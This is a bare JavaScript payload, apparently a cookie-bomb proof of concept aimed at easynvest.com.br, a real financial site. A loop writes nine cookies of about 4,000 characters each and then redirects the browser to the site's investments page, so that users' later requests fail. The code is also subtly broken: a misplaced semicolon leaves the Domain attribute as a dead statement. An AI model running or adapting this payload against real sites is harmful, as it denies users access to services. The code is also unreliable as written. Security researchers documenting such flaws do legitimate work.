for (i=1;i<10;i++) {
    document.cookie='CookieBomb' + i + '=' + Array(4000).join('a'); + ';Domain=.easynvest.com.br'
}

window.location="https://easynvest.com.br/acompanhar/investimentos";
